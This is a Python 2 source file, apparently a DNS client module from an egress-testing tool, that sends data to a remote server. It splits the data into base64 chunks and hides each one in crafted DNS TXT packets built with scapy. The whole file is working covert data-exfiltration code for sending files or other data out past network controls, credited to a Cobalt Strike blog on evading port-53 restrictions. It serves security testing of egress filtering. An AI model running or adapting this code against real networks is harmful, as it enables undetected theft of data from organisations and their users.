'''

This is a DNS client that transmits data within DNS TXT requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

'''

import base64
import re
import socket
import sys
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = "dns"
        self.length = 62
        self.remote_server = cli_object.ip

    def transmit(self, data_to_transmit):

        byte_reader = 0
        packet_number = 1

        # Determine if sending via IP or domain name
        if self.validate_ip(self.remote_server):
            final_destination = self.remote_server
        else:
            print "[*] Resolving IP of domain..."
            final_destination = socket.gethostbyname(self.remote_server)

        print "[*] Splitting data into chunks that fit in DNS packets...."

        while (byte_reader < len(data_to_transmit) + 35):
            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + 35])

            # calcalate total packets
            if ((len(data_to_transmit) % 35) == 0):
                total_packets = len(data_to_transmit) / 35
            else:
                total_packets = (len(data_to_transmit) / 35) + 1

            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)

            # Craft the packet with scapy
            try:
                send(IP(dst=final_destination)/UDP()/DNS(
                    id=15, opcode=0,
                    qd=[DNSQR(qname="egress-assess.com", qtype="TXT")], aa=1, qr=0,
                    an=[DNSRR(rrname=encoded_data, type="TXT", ttl=10)]),
                    verbose=False)
            except KeyboardInterrupt:
                print "[*] Shutting down..."
                sys.exit()

            # Increment counters
            byte_reader += 35
            packet_number += 1

        return

    def validate_ip(self, val_ip):
        # This came from (Mult-line link for pep8 compliance)
        # http://python-iptools.googlecode.com/svn-history/r4
        # /trunk/iptools/__init__.py
        ip_re = re.compile(r'^(\d{1,3}\.){0,3}\d{1,3}$')
        if ip_re.match(val_ip):
            quads = (int(q) for q in val_ip.split('.'))
            for q in quads:
                if q > 255:
                    return False
            return True
        return False
